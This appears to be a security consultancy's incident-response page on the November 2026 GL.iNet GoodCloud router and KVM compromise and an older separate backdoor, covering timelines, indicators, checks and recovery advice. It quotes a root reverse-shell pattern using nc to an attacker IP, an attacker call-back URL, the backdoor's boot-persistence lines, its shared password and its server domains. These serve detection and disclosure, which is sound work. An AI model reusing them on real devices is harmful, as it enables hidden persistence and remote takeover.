# GL.iNet cloud incident, November 2026: what is known, how to check, how to recover

**What this page is.** A place to coordinate findings on the GL.iNet cloud remote-management
incident of 20 November 2026, kept by [RemoteToHome Consulting](https://remotetohome.io), a
security consultancy providing networking, VPN and IT solutions for digital nomads, expats and
small business. GL.iNet's information is spread over
forum threads that change and get buried; this page collects what is known in one place and is
updated as findings come in.

We manage a large and varied set of GL.iNet routers and are checking them model by model. The
results go into [docs/field-survey.md](docs/field-survey.md) as counts by model and firmware, with
nothing that identifies an owner, a network or a device. Every statement here says where it comes
from and how it was checked. Corrections and findings from anyone are welcome: see
[CONTRIBUTING.md](CONTRIBUTING.md).

**Last reviewed: 2026-11-28 01:26 UTC.** GL.iNet's notice changes; read
[the current version](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056)
as well.

This is not an official GL.iNet page. RemoteToHome (RTH) is an independent GL.iNet business
partner supporting our common customers.

**Start here:** [check a device](#check-a-device) ·
[if you find something](#if-you-find-something) ·
[fixed firmware](#fixed-firmware) ·
[what GL.iNet has said](#what-glinet-has-said) ·
[the short version](#the-short-version) ·
[all findings](docs/findings.md)

> **New, 28 November 2026: GL.iNet's COO takes responsibility, and GL.iNet's site notice now
> covers the older backdoor.**
>
> - **GL.iNet's co-founder and COO, Alfie Zhao, has posted a message on the incident.** He takes
>   responsibility for "the slow and incomplete communication". GL.iNet is engaging an outside
>   legal and forensic team, including on "the questions raised about our earlier activity", has
>   brought in a security firm to audit its firmware, cloud services and source code, and will
>   publish a report with the full findings once the scope is known. No date is given.
>   [His message](https://forum.gl-inet.com/t/a-message-from-gl-inet-coo-about-the-secuirty-incident/73365) ·
>   [our record of it](docs/gl-statements.md#a-message-from-glinets-coo-27-november-2026)
> - **GL.iNet's site notice was rewritten, marked 26 November.** It now addresses the older
>   backdoor: GL.iNet is investigating it and is still checking how it reached devices and whether
>   it is connected to 20 November. Its firmware table gives the second-round versions, and for
>   the older malware it says to install the latest stable build. Some passages were dropped,
>   among them "Do not assume incident malware cleanup resolves every separate persistence
>   finding"; the notice still calls the clean-up targeted, not a general malware scan, and the
>   forum copy still has the dropped passages.
>   [What changed](docs/gl-statements.md#site-notice-26-november-2026)
> - **GL.iNet's security advisories page names 4.11.3 as the fixed version for the GL-MT3000 and
>   GL-MT6000,** one step above the notice's 4.11.2. 4.11.3 was released on 27 November; its
>   release note mentions no security fix, and we have not read the build. The page also gives
>   four of GL.iNet's vulnerability reports identifiers of the form `vdb-submit-…`; they are not
>   CVE numbers.
>   [Details](docs/gl-statements.md#the-security-advisories-page)

> **New, 27 November 2026: a second check of our routers, and what actually cleans one.**
>
> - **These are two separate attacks.** The attack of 20 November and the older backdoor have
>   different timelines, tools and servers, and we have found nothing that links them. See
>   [Two separate events](#two-separate-events).
> - **The latest firmware cannot guarantee a clean device when installed with "Keep Settings"
>   enabled.** Below we demonstrated how implants can persist across firmware upgrades and still
>   run as root afterwards.  We also demonstrate how a factor reset by itself leaves hidden folders 
>   in place. **A firmware reinstall/upgrade with "keep settings" disabled is the only clean path
>   after an IOC. Full stop.** See the whole test in [docs/cleanup-test.md](docs/cleanup-test.md).
> - **The fixed firmware closes the hole on the cloud. It has not closed the hole on the router:**
>   the router still carries out a cloud command without checking who sent it. See
>   [Fixed firmware](#fixed-firmware).
> - **If `/etc/mp_ip_mapping_info` exists on a router that never used AstroWarp, treat the
>   router as fully compromised.** The attacker ran a command on it with full rights, and on some
>   routers that command opened a remote shell.
> - **Sweep update: 216 routers checked so far. 175 show the attack of 20 November, the older 
>   backdoor, or both.** A root remote shell on 25, the older backdoor on 51, and a command from 
>   the attacker >   on 99 more. On 26 November we went through them again and reached 17 routers 
>   for the first time: the older backdoor was running on 2, and on 1 a remote shell from 20 
>   November was still running six days later. See [docs/field-survey.md](docs/field-survey.md).
> - **KVM owners:** how to switch the cloud service off, and why a new or reinstalled KVM should
>   stay off the internet until you have. See
>   [Reducing exposure](#reducing-exposure-until-fixed-firmware-is-installed).

> **New, 24 November 2026: the attacker was already testing on 19 November, a day and a half
> before the attack. It is in GoodCloud's own log.**
>
> - **The first calls were on the morning of 19 November.** Four devices answered requests that
>   GoodCloud itself did not send: three at 08:48 to 08:49 UTC, with messages made to look
>   ordinary, and one at 09:33:36 UTC in the form used for the whole attack. Then nothing until
>   the main wave began at 20:06 UTC on 20 November. It reads as a trial run on a handful of
>   devices. GL.iNet's notice dates the incident to 20 November.
> - **GoodCloud keeps a log of what each device sent to the cloud, and an owner can read it.**
>   In our own account, in a cross-section of 260 devices read so far, 210 answered the attacker.
> - **Any owner can check a device there without SSH,** also after it has been reset.
>
> See [docs/goodcloud-device-log.md](docs/goodcloud-device-log.md).

> **New, 23 November 2026: what our own samples show.** We have now taken apart the malware and
> the memory images we saved from the routers we manage. Nothing was run; everything was read.
> The main results, each with its own page:
>
> - **The attack of 20 November and the KVM implant used the same server.** In one router's
>   memory we found a command, sent through GL.iNet's cloud, that calls
>   `http://66.245.219.252:8899/wake?m=KK_<id>`. That is the server, port and path that forum
>   users found in the KVM implant ("gl-helper"). *Correction: until today this page said neither
>   KVM-side address had been found on a router.*
> - **The attacker's folder check reached far more routers than we first showed:** it was still
>   in the memory of 98 routers of 11 models, not seven. We recovered eight distinct attacker
>   messages in all, including two ways of ending the shells that we had not published. The only
>   thing typed into any reverse shell that we could recover was that same folder check.
> - **The older backdoor's loader is fully decoded,** all 49 copies. One XOR key for every router;
>   a different 40-character identifier built into each router's file, so one file was built per
>   victim; five server names in two sets. Its servers answered the routers with a download
>   address, the second stage's name (`ujaild`) and one password for all:
>   `JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV`.
> - **The second stage is a general remote-control tool.** It can run any command, write any
>   file, drop and run a program, and open a proxy into the network behind the router. It is
>   written in Go and hidden with the `garble` tool. Its server names are stored encrypted in the
>   program; decrypted they are `up.adguardns.com`, `up.adguardns.org` and a name not reported
>   before, **`up.adsanalypro.com`**. In the memory of 47 routers we found check-ins going back to
>   May 2026, but no order from the server: at the time we looked, none of them was being told to
>   do anything. That does not show none ever was.
>
> - **GL.iNet changed its guidance on 23 November.** Its site notice now says to reinstall
>   without keeping settings where access is known or suspected, and to replace passwords and
>   keys. It also published the cause and its own vulnerability reports, four of which are dated
>   mid-October. See [What GL.iNet has said](#what-glinet-has-said).
>
> Pages added today: [every attacker message](docs/attacker-messages.md) ·
> [the older backdoor's loader](docs/older-backdoor-loader.md) ·
> [its second stage](docs/older-backdoor-second-stage.md) ·
> [the KVM implant](docs/gl-helper-implant.md) ·
> [weaknesses the fix leaves open](docs/open-weaknesses.md) ·
> [GL.iNet's statements and staff posts over time](docs/gl-statements.md). Tools you can run on
> your own samples are in [tools/](tools).

> **New, 22 November 2026: the exploit in detail, and where it came from.** GL.iNet has released
> fixed firmware, so the details we had held back are now published:
>
> - [Technical breakdown](docs/technical-breakdown.md): the flaw line by line, how we read code
>   that ships only in compiled form, and its history back to firmware released in December 2024.
> - [Fixed firmware](#fixed-firmware): what the fix does, what its clean-up leaves behind, and
>   which models have it.
>
> One further weakness is not addressed by the fixed firmware we read. We reported it to GL.iNet
> on 22 November and are withholding it until it is fixed.

## The short version

1. **The weakness on the router has shipped in GL.iNet firmware since December 2024.** The cloud
   client runs, as root, a value from a cloud message without checking it. Every version we have
   read from GL-MT3000 4.7.0 (released 5 December 2024) to 4.11.0 has it. For 715 days before the
   attack of 20 November 2026, any such router with GoodCloud switched on would run whatever
   command arrived over that channel, whether or not AstroWarp was in use. GL.iNet has not said
   when the cloud side became usable by an outsider. The client is shipped as compiled code and
   we have not found its source in GL.iNet's published repositories, so nobody outside the
   company was in a position to review it.
2. **This is not limited to one model, and it is not rare on the routers we manage.** Of 216
   routers we have reached so far, 175 show the attack of 20 November, an older backdoor, or both:
   a root remote shell on 25 (GL-AXT1800 and GL-MT6000), an older backdoor installed and running
   on 51 (GL-MT2500, GL-MT3000, GL-MT6000, GL-AX1800 and GL-AXT1800), and on 99 more a command
   from the attacker that ran as root. *Updated 27 November 2026: these are the totals after the
   second sweep. Until then this item gave the first sweep's figures: 199 reached, 166 with a
   sign, a shell on 24, the backdoor on 49, the command on 93.* That is not a random sample; see
   [docs/field-survey.md](docs/field-survey.md). On the 17 routers first reached on 26 November,
   the older backdoor was running on 2 and a remote shell from 20 November was still running on
   1. Nothing had come back on the routers we had cleaned.
3. **If your router or KVM had GL.iNet's cloud service switched on, check it now**, before you
   reboot or upgrade it. Some traces only exist until the next restart.
4. **GL.iNet's published check looks for one process (`crond -i /tmp/.log`). We have not found
   that process on a single router.** The remote shell, the attacker's command and the older
   backdoor all read as healthy in that check. Use the wider checks in
   [Check a device](#check-a-device).
5. **Killing a process or reinstalling firmware does not undo a compromise.** If a device was hit,
   every key and password stored on it should be treated as read by someone else. That includes
   its VPN client profiles and SSH keys: access has to be removed on the server side as well. See
   [If you find something](#if-you-find-something). *Added 27 November:* on a router of our own
   we measured the three ways an owner can clean a router. Only one left nothing behind:
   **installing the firmware again with "Keep Settings" switched off.** An upgrade that keeps
   settings carries start-up changes across, and a factory reset leaves hidden folders in place.
   If a router showed any sign at all, that reinstall is the step to take.
6. **GL.iNet has released fixed firmware for most router models. Install it, but do not treat it
   as a clean-up.** Stable builds dated 22 and 23 November are in its listing for eighteen router
   models; see [Fixed firmware](#fixed-firmware). In the build we read, the handler that the
   attack came through has gained input validation. The firmware's own clean-up is partial: in
   our test, start-up entries it does not name survived an upgrade with settings kept and ran.
   Other weaknesses remain ([docs/open-weaknesses.md](docs/open-weaknesses.md)), and one
   further weakness in the cloud client is not addressed in that build: we reported it to
   GL.iNet on 22 November and are not publishing it. A router that shows any sign still needs the steps in
   [If you find something](#if-you-find-something). *Added 25 November:* a second round of
   builds followed on 24 November. In the two of them we have read, the clean-up also removes
   the older backdoor's files; it is still a list of known names, and we have not tested it on a
   device. *Added 28 November:* GL.iNet released 4.11.3 for the GL-MT3000 and GL-MT6000 on
   27 November and names it as their resolved version on its security advisories page. Its
   release note mentions no security fix; we have not read it.

## Two separate events

*Added 27 November 2026.* This page covers two different compromises of GL.iNet routers. They
have separate timelines, separate tools and separate servers, and we have found nothing that
links one to the other. What they share is the population they hit: routers connected to
GoodCloud.

| | The attack of 20 November 2026 | The older backdoor |
|---|---|---|
| What it is | Commands sent to routers and KVMs through GoodCloud in one wave: a check for the KVM implant on most routers, a root remote shell on some, an implant on KVMs | A loader and a second-stage program installed on routers one batch at a time and left running |
| First trace we hold | 16 November 2026: a look-alike domain name is registered (A-7) | 4 July 2025: three of its server names are registered within eight minutes (A-10) |
| First activity on a device | 19 November 2026, 08:48 UTC: the first of four early calls, seen in our GoodCloud log | 15 September 2025: the earliest install date on a router we manage (R-18) |
| Main period | 20 November 2026, from about 20:00 UTC, into the next day | September 2025 to May 2026, in batches; most installs in December 2025 |
| Still active | One remote shell was still running on 26 November, on a router not restarted since (R-42) | Installed and running on the routers where we found it, until we removed it; found running on two more routers on 26 November (R-41) |
| Servers | `170.39.226.219`, and the KVM implant's `66.245.219.252` | Six domain names of its own, behind Cloudflare |
| How it got in | Through GoodCloud's message service and a flaw in the router's cloud client (GL.iNet's statement and our own reading) | **Not shown.** See below |
| Routers in our data | 25 with a remote shell; the attacker's command on most of the rest | 51 |

**What the two timelines have in common is one date:** the flaw in the router's cloud client
first shipped on 5 December 2024 (R-5). It was there for both. That the 20 November attack used
it is established. That the older backdoor was installed through it is not: 48 of the first 49
routers were bound to GoodCloud before their install date and most had no public address, which
points at GoodCloud and does not prove it.

**Why we treat them as separate.** These are measurements, not a judgement about who was behind
either:

- The attack's messages, the routers' replies and the text recovered from the remote shells
  never mention any file, process or server of the older backdoor.
- The attack was sent to routers the older backdoor already controlled, as if it were not there.
- The files, the servers and the tools are different in every part we have read.

What these facts make likely, what would fit the opposite, and what would settle it are on
[docs/inferences.md](docs/inferences.md) (inferences 1 and 4). The record that would settle it is
GL.iNet's: who published to these routers in the minutes the older backdoor's files were written.

## What GL.iNet has said

From the notice on [GL.iNet's site](https://www.gl-inet.com/en-gb/blogs/blog/glinet-security-notice-2026-11-20) as it read at 19:07 UTC on 23 November 2026
(marked "Updated November 23, 2026 (UTC)"). GL.iNet rewrote that page on 23 November. Its
[forum copy](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056)
still carried the earlier text when we checked at 19:06 UTC; the table below shows how the
wording has moved. These are GL.iNet's statements, not our findings:

> *Update, 28 November 2026.* The list below summarises the site notice of 23 November and is kept
> as it was. GL.iNet has rewritten the site notice since; it now reads "Updated November 26, 2026
> (UTC)" and was in our copy of 27 November at 16:05 UTC, not in that of 09:00 UTC. It adds a
> section on the older backdoor, citing this repository: GL.iNet is investigating it and is still
> checking how it reached devices and whether it is connected to the incident. Its firmware table
> now gives the second-round versions, and for the older malware it says to choose the latest
> stable build. It no longer says "Do not assume incident malware cleanup resolves every separate
> persistence finding" (it still calls the clean-up targeted, not a general malware scan), nor
> that some KVMs have the cloud service enabled before an account is linked; the forum copy still
> says both. Four of GL.iNet's vulnerability reports, among them the three the notice links, now
> carry identifiers of the form `vdb-submit-<number>` on its
> [security advisories page](https://www.gl-inet.com/blogs/security-updates/security-advisories-vulnerabilities-and-cves-nov-24-2026);
> they are not CVE numbers. And on 27 November GL.iNet's COO posted a
> [message](https://forum.gl-inet.com/t/a-message-from-gl-inet-coo-about-the-secuirty-incident/73365)
> on the incident. All of it is in [docs/gl-statements.md](docs/gl-statements.md).

- **The incident.** On 20 November 2026 GL.iNet identified unauthorized access to some routers
  and KVM devices connected to GoodCloud. The attack path was blocked the same day.
- **How it happened.** A configuration error in GoodCloud's device-messaging service let a client
  send management messages to other users' connected devices. Separately, a flaw in the
  AstroWarp / SD-WAN part of the router could run such input as commands with root rights,
  "even when AstroWarp was turned off". GL.iNet has published
  [vulnerability reports](https://github.com/gl-inet/CVE-issues) for these; the identifiers are pending.
- **Install the security firmware,** for your exact model. The minimum versions:
  - Routers: GL-MG1300, GL-MT3000, GL-MT6000: 4.11.1. GL-E5800: 4.10.3. GL-BE3600, GL-BE9300:
    4.10.2. GL-BE14000: 4.9.3. GL-BE6500, GL-MT3600BE, GL-MT5000: 4.9.1. GL-BE10000: 4.8.7.
    GL-AX1800, GL-AXT1800, GL-SFT1200, GL-X3000, GL-XE3000: 4.8.4. GL-MT2500 / GL-MT2500A,
    GL-X2000: 4.7.14.
  - *Added 26 November 2026:* the forum copy of the notice lists two more groups of routers
    that the site copy does not. GL-A1300, GL-X300B: 4.5.24. GL-AP1300, GL-AR300M (NAND),
    GL-AR300M16, GL-AR750, GL-AR750S-EXT, GL-B1300, GL-E750 / GL-E750V2, GL-MT1300,
    GL-MT300N-V2, GL-X750, GL-XE300: 4.3.31.
  - KVMs: RM1, RM1V2, RM10, RM10RC, RM1PE, RM4PE: 1.10.3. RMQ1: 1.8.7.
- **If access is known or suspected:** "for the strongest standard recovery assurance", install
  the official security firmware **without keeping settings**, configure the device again by
  hand, use new passwords and keys, and do not restore a backup from that device. On a router
  turn "Keep Settings" off; on a KVM clear "Save current configuration". A factory reset alone
  does not install the fixes.
- **Keeping settings** "remains an option you may choose", for example to preserve remote
  access; the notice says it "may retain other unauthorized changes" and gives less assurance.
- **Passwords and keys.** If your device connected to GoodCloud, change the passwords and
  replace the keys stored on it, "even if a check finds nothing". An update cannot take back a
  key that was already copied.
- **What the firmware's clean-up is:** "targeted cleanup" of the known malware of 20 November,
  "not a general malware scan or a complete integrity check".
- **Checks are optional and cannot rule out earlier access.** The community script is the first
  choice. The router check for the process `crond -i /tmp/.log` is no longer on the page.
- **The older backdoor** that forum users reported is acknowledged as a separate finding whose
  entry path is not established; owners should not assume the clean-up resolves it.
- **If a KVM is affected,** also check the computer connected to it.
- **Notifications.** GL.iNet will email the owners of devices it identifies as affected.
- **Still being determined:** how many devices, over what period, and whether computers
  connected to affected KVMs were accessed.

The notice now links to this repository twice: to our KVM firmware page and to the
[If you find something](#if-you-find-something) section of this page. *Updated 28 November
2026:* the site notice of 26 November links to this repository six times, to five places
([the list](docs/gl-statements.md#site-notice-26-november-2026)).

GL.iNet has not published the time window, how many devices, or what the malicious software
does. Its router report names one affected firmware version per model; we find the same code
from December 2024 onward.

**How the notice has changed.** Earlier wording is kept, with dates, in
[docs/gl-statements.md](docs/gl-statements.md). The times are the forum's edit times of the
versions we saved; three earlier edits on 21 November were made before our first copy.

| Version edited (UTC) | What it told owners |
|---|---|
| 21 November, 10:35 | Factory reset every router and KVM and set it up again. Corrective measures had been implemented "on affected devices". No indicator and no check |
| 21 November, 14:10 | The factory reset recommendation was removed. In its place: links to two forum topics on how to check a router and a KVM |
| 21 November, 16:00 | Rewritten. One indicator, `crond -i /tmp/.log`. If found: KVM beta firmware, or a factory reset. If not found: no reset or cleanup needed. The sentence about corrective measures on affected devices was removed |
| 23 November, 01:53 | The security firmware is said to remove the malware with settings kept; the factory reset option is gone, also when the indicator is found; the official checks "may not detect every affected device". The forum copy still showed this text at 19:06 UTC |
| 23 November, after 14:31 (site only) | The current text above. Reinstall without keeping settings is the strongest recovery; keeping settings is a lesser option; replace passwords and keys; the router process check is gone; the cause and vulnerability reports are published |
| Marked 26 November; in our copies from 27 November, 16:05 (site only) | A section on the older backdoor, which GL.iNet is investigating; second-round firmware versions, and the latest stable build for the older malware; the sentence not to assume the clean-up resolves every separate persistence finding, and the note that some KVMs have the cloud service enabled before an account is linked, are gone |

*Added 26 November 2026:* the forum post now carries the site notice's text as well. The forum's
data shows its last update on 24 November at 04:04 UTC. The one difference we found between the
two copies is the two extra groups of router models listed above. On 27 November at 02:05 UTC
the forum post was edited again: its firmware table now gives the second-round versions (4.11.2
and its counterparts); the site notice still listed the first-round versions at 04:44 UTC.

**Where this stands against what we found.** The site notice now agrees with the main points on
this page: do not keep settings on a device that may have been hit, replace what it stored, and
do not rely on one process name. Two differences remain. It still offers keeping settings as a
choice; in our tests start-up entries placed in kept settings survived the upgrade and ran, on
a router and on a KVM ([Fixed firmware](#fixed-firmware)). And it treats the older backdoor as
possibly unrelated; we cannot show how it was installed either, but every one of our 49 routers
that had it and that we could check was bound to GoodCloud before its install date. GL.iNet's
own reports also show that part of what made the KVM side possible was written up in mid-October
([docs/gl-statements.md](docs/gl-statements.md#glinets-published-vulnerability-reports)).

## What has been found beyond that

Full list with sources and evidence in [docs/findings.md](docs/findings.md). The main points:

| Finding | Status |
|---|---|
| The GoodCloud client on the router passes a value from a cloud message to the shell, as root, without checking it. That is how the attack got in | Verified by us by reading the client's code. Confirmed by GL.iNet's own vulnerability report on 23 November |
| The earliest firmware in which we find that code is GL-MT3000 4.7.0, released 5 December 2024. The 4.6 images we read do not have it. It is still in GL-AXT1800 4.8.4 (beta of 11 November) and GL-MT3000 4.11.0 | Verified by us from the official images and from routers |
| It runs whether or not AstroWarp / SD-WAN is enabled | Verified by us |
| GL.iNet's fixed firmware adds input validation in that same handler, and a start-up clean-up that restores the file the older backdoor changes. It leaves one further weakness in the cloud client unaddressed in the build we read. *Added 25 November:* in the two builds of 24 November that we read, the clean-up also removes that backdoor's files | Verified by us in the GL-MT3000 4.11.1 build; two builds of 24 November read, not tested; see [Fixed firmware](#fixed-firmware) |
| The attacker used it on at least eleven models: GL-AX1800, GL-AXT1800, GL-BE3600, GL-BE6500, GL-BE9300, GL-BE10000, GL-MT2500, GL-MT3000, GL-MT3600BE, GL-MT5000 and GL-MT6000, on firmware from 4.7.0 to 4.9.1 | Verified by us: the attacker's message was still in the memory of the cloud client on those routers; see [docs/attacker-messages.md](docs/attacker-messages.md) |
| On GL-AXT1800 (firmware 4.8.2 and 4.8.3) and GL-MT6000 (firmware 4.9.1) it opened a root remote shell to `170.39.226.219`, starting between 20:06 and 21:40 UTC on 20 November. On routers that were not restarted the shell was still running, or still trying to reconnect, on 22 November | Verified by us on 24 routers we manage or own; two more reported by other owners |
| On most routers it ran a single command as root and left only a firewall rule. We recovered that command from the memory of 98 routers: it looks for the folders of the KVM implant ("gl-helper") and sends the result to `170.39.226.219`. In all we recovered eight distinct messages: three forms of that check, the remote shell, three ways of ending the shell, and a call-back | Verified by us; another owner recovered the folder check independently |
| The only thing we could recover that was typed into a remote shell is the same folder check, by hand, in 36 of 106 shell images; where the answer was still in memory the folder was not there | Verified by us |
| The attack on routers and the KVM implant used the same server: one router was sent a command, through GL.iNet's cloud, that calls `http://66.245.219.252:8899/wake?m=KK_<id>`, the server, port and path of the KVM implant's own report | Verified by us on one router; the KVM side is reported by forum users; see [docs/gl-helper-implant.md](docs/gl-helper-implant.md) |
| A separate, older backdoor is installed and running on 49 routers we manage (GL-MT2500, GL-MT3000, GL-MT6000, GL-AX1800 and GL-AXT1800; firmware 4.7.0 to 4.11.0), with file dates from September 2025 to May 2026. *Updated 27 November 2026: 51 routers, after two more were found running it on 26 November.* It was installed in batches on routers in unrelated networks, almost none of which has a public address. It starts at every boot and adds itself to the list of files kept across upgrades | Verified by us; first reported by forum users |
| That backdoor's loader was built once per router, reports the router's serial number, addresses, model and firmware to its servers every three days, and fetches a second stage that can run any command, write any file and open a proxy into the network behind the router. On 47 routers the second stage had been checking in for up to six months and no task was in its memory when we captured it | Verified by us from 49 copies of each and 47 memory images of each; see [the loader](docs/older-backdoor-loader.md) and [the second stage](docs/older-backdoor-second-stage.md) |
| The fixed firmware's clean-up removes the two start-up routes it names and nothing else: on a test router, other start-up entries placed in kept settings survived an upgrade with settings kept and ran. *Added 25 November:* tested on the first round (4.11.1); the second round's script removes more and has not been tested | Verified by us on a GL-MT3000; see [Fixed firmware](#fixed-firmware) |
| GL.iNet's published indicator, a `crond -i /tmp/.log` process, was not running on any router we checked, including all of the above | Verified by us |
| The shells connected to `170.39.226.219`, a rented server in a range registered to a US hosting company, which the registry places at a site in New Jersey; no customer is named in the registry. We reported it to the provider on 21 November 2026; the provider replied the same day that it has suspended the server, notified its customer and preserved the data. On 22 November the address did not answer from any of 20 outside test points | Verified by us from public registries; see [docs/attacker-infrastructure.md](docs/attacker-infrastructure.md) |
| The shell leaves one file behind, an empty `/etc/mp_ip_mapping_info`; the shell, its named pipe `/tmp/f` and the firewall rule are gone after a reboot | Verified by us |
| KVM firmware 1.10.3 removes an implant called "gl-helper" at boot on all six models we read. In 1.10.2 the RM1PE did and the RM1 did not. It keeps no copy, so upgrading an infected KVM removes the evidence | Verified by us from the official images; see [docs/kvm-firmware.md](docs/kvm-firmware.md) |
| A KVM upgrade to 1.10.3 that keeps the configuration also keeps a boot script and an added SSH key, and the script runs on the new firmware. SSH is on at every boot in 1.10.3 | Verified by us on a test RM1 with harmless stand-ins; see [docs/kvm-firmware.md](docs/kvm-firmware.md) |
| On the RM1, an upgrade that keeps settings carries the password, SSH keys and `/etc/kvmd/user` across | Verified by us on a test unit |

## The signs, and what each one means

Seven different things get called "an indicator" in this incident. They are not equal: some show
that an attacker's command ran, some show a backdoor that is still running, and some vanish at
the next restart.

The attack of 20 November came in through one cloud command, `virtual_ip_info`, in the AstroWarp
part of the router's cloud client. The firewall rule, the state file and the cloud log entry
below are all traces of that command; the remote shell is what the attacker chose to run through
it on some routers. You may see the command's name on the forum, and the community triage
script reports the state file as "cloud-command". The checks further down and the [field survey](docs/field-survey.md) use these
names.

| Sign | What you see | Survives a restart | What it tells you |
|---|---|---|---|
| **Remote shell** | Processes `nc 170.39.226.219 <port>`, `/bin/sh -i`, `cat /tmp/f`, and a parent whose command line starts `sh -c iptables -t nat -A SDWAN_IP_MAPPING` | No | Someone outside has, or had, an interactive root shell on the router. The parent keeps retrying, so it reconnects by itself if that server answers again |
| **Shell pipe** | `/tmp/f`, a named pipe (the listing line starts with `p`) | No | The remote shell has run since the last boot, even if it has been stopped |
| **Firewall rule** | `-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1` in the NAT table | No. It is also gone once GoodCloud is switched off on the router, without a restart | The cloud client was sent the attacker's message and ran it as root. The rule itself is harmless; it is the wrapper the attacker's command arrived in |
| **State file** | `/etc/mp_ip_mapping_info`, empty, dated 20 November 2026 or later, on a router that does not use AstroWarp | Yes | The same handler ran. It is the only trace left after a restart. It does not show what the message carried - and this is not a small gap. The command ran as root, and on some routers it opened a remote shell: from that moment the attacker had full control of the router without going through GoodCloud, and nothing on the router or in GL.iNet's cloud records what was done through it. After a restart you cannot tell whether your router received that command or the folder check. **Treat a router with this file as fully compromised.** The first calls we know of were on 19 November, so a file dated 19 November counts too ([GoodCloud log](docs/goodcloud-device-log.md)) |
| **Cloud log entry** | In the device log exported from your GoodCloud account: command responses containing `"astrowarp"` with the id `1`, where ordinary commands carry a 32-character id | Yes, it is kept on GL.iNet's side | The `virtual_ip_info` command was sent to that device, with the time. Reported by three owners (finding R-31); we have not exported such a log ourselves, but the reply text matches what we recovered from routers' memory. *Updated 25 November:* on 24 November we read these entries on the Device Logs page of our own GoodCloud account, in a cross-section of 260 devices read so far ([docs/goodcloud-device-log.md](docs/goodcloud-device-log.md)) |
| **Older backdoor** | Extra lines at the top of `/etc/init.d/urandom_seed`, a file `/bin/ulogd`, and an added line in `/lib/upgrade/keep.d/netifd`; when running, processes named `monitord` and `ujaild` | Yes; its keep-list line is there to carry it through upgrades that keep settings | A separate, earlier compromise, with file dates from September 2025 on. It starts at every boot, reports to its own servers and fetches a remote-control program that runs from memory. See [The older backdoor, step by step](#the-older-backdoor-step-by-step) |
| **GL.iNet's indicator** | GL.iNet's check for a router is `ps \| grep tmp` over SSH (or search for `tmp/.log` in LuCI under Status → Processes); a hit is a line containing `crond -i /tmp/.log`. On a KVM it is `ps -aux \| grep tmp` (`ps -a \| grep tmp` on the RMQ1). All four are in [GL.iNet's own checks](#glinets-own-checks) | Not known to us | The one sign GL.iNet's notice tells owners to look for. It is reported to be a false name that the KVM implant's helper writes over its own process ([docs/gl-helper-implant.md](docs/gl-helper-implant.md)). We have not found it on any router |

How to read a combination:

- **Rule or state file, nothing else:** the attacker's command ran on the router. On the 98
  routers where we recovered it, that command only looked for another implant and reported back. Treat
  the router as reached by the attacker; we cannot show that nothing more was sent.
- **Remote shell or shell pipe:** treat every key and password on the router as read.
- **Older backdoor:** the same, and for much longer.
- **None of them on a router that has been restarted since 20 November:** only the state file
  and the older backdoor could still be there. A clean result says less than it seems to.

On a GL-AXT1800 the firewall rule did not appear in the listing on our own unit although the
handler had run, so on that model do not rely on the rule being absent.

## The older backdoor, step by step

This is the compromise in the "Older backdoor" row above: separate from the attack of
20 November, and on the routers we manage it had been running for up to fourteen months. What
follows is measured on those 49 routers and read from the files we saved from them before
removal. We ran none of it. Full hashes and install dates are in the
[technical breakdown](docs/technical-breakdown.md#the-older-backdoor).

**What it puts on the router.** Three changes on disk, all in the writable layer:

1. A new file, `/bin/ulogd`. It is not a program in the usual sense: it is compiled Lua 5.1
   bytecode, 33,722 bytes on 42 routers and 35,745 bytes on 7. Its SHA-256 is different on
   every router. Its internal names are scrambled (random six-letter names) and its text is not
   readable as it stands. The name imitates a real logging daemon.
2. Five lines added directly under the first line of `/etc/init.d/urandom_seed`, a start-up
   script that belongs to the firmware and runs last at boot:

   ```
   cp /usr/bin/lua /usr/bin/monitord
   cp /bin/ulogd /var/run/monitord.pid
   /usr/bin/monitord /var/run/monitord.pid &
   sleep 2
   rm /var/run/monitord.pid
   ```

   The changed file has the same SHA-256 on all 49 routers:
   `3265f27feb954744581cdea2373b88ceae9d85b67e90487353fd48902cf4fc19`.
3. Two lines added to `/lib/upgrade/keep.d/netifd`, the list of files an upgrade carries over:

   ```
   /bin/ulogd
   /etc/init.d/urandom_seed
   ```

   On 9 of the 49 routers these two lines were missing and the rest was there and running.

**What happens at every boot.**

1. The firmware runs `urandom_seed` as one of its last start-up steps. The five lines run
   first.
2. They copy the router's own Lua interpreter to `/usr/bin/monitord`. That copy is not
   malicious in itself: on our MediaTek routers it is byte for byte the firmware's
   `/usr/bin/lua5.1` (12,299 bytes, SHA-256
   `dc824e186b783450961d98709b458c7be82f40f9a0cfdbef0693dbfc37b10b46`, the same as in GL.iNet's
   GL-MT3000 4.11.1 image). The copy exists so that the process is called `monitord` and not
   `lua`.
3. They copy `/bin/ulogd` to `/var/run/monitord.pid`, a name that looks like an ordinary
   process-id file, and start it with the renamed interpreter. This is the loader. In the
   process list it shows as `/usr/bin/monitord /var/run/monitord.pid`.
4. Two seconds later they delete `/var/run/monitord.pid`. The loader keeps running, but the
   file it was started from is gone.
5. The loader fetches the second stage, writes it to `/tmp/ujaild`, starts it under the name
   `/usr/sbin/ujaild`, and the file in `/tmp` is deleted. On the router where we timed it the
   loader started 36 seconds after boot and the second stage about five minutes after boot.
   The next part describes how.

**What the loader does.** Verified by us on 23 November 2026 by decoding all 49 of our copies
and reading the memory of 47 running loaders; nothing was run. Forum users decoded it first, in
[this forum topic](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097), and their posts are credited where they found a point before we did.
The full account, command by command, with a decoder you can run on your own sample, is in
[docs/older-backdoor-loader.md](docs/older-backdoor-loader.md).

- **It hides its text.** Every string is stored one character at a time as a value, a position,
  an operation (add, subtract or xor) and a key, so a plain search of the file finds no address
  or command. The file is Lua 5.1 as OpenWrt builds it, which standard decompilers refuse
  (first described by UnhappyCloud, [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), and rdizzie, [post 39](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/39)).
- **One file was built per router.** Copies of the same size differ in one place only: a
  40-character identifier. It is different on each of our 49 routers and is not derived from
  anything on the router. That is why the file has a different hash everywhere.
- **At start** it exits if a copy is already running, restarts the system log service (which
  empties the log), and, if the router has been up for less than ten minutes, waits five
  minutes.
